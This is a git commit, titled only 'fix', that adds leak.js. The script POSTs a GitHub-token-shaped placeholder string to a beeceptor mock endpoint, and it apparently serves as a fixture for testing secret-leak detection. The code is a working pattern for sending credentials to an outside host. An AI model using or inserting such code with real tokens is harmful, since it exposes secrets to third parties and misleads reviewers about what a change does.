9c22939495c2808956c4ca561142204a9ca38538
Ashok Kasti <ashok.kasti@veribom.com>
2024-07-11 13:52:31 +0545

    fix

---
+++ leak.js
@@ -0,0 +1,28 @@
+// The URL to which you want to make the POST request
+const url = 'https://vbirmock.free.beeceptor.com';
+
+// The data you want to send in the request body
+const data = {
+  GH: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz',
+};
+
+// Options for the fetch call
+const options = {
+  method: 'POST', // HTTP method
+  headers: {
+    'Content-Type': 'application/json' // Content type
+  },
+  body: JSON.stringify(data) // Convert the data to JSON string
+};
+
+// Make the POST request
+fetch(url, options)
+  .then(response => {
+    return response
+  })
+  .then(data => {
+    console.log('Success:'); // Handle the response data
+  })
+  .catch(error => {
+    console.error('Error:'); // Handle any errors
+  });
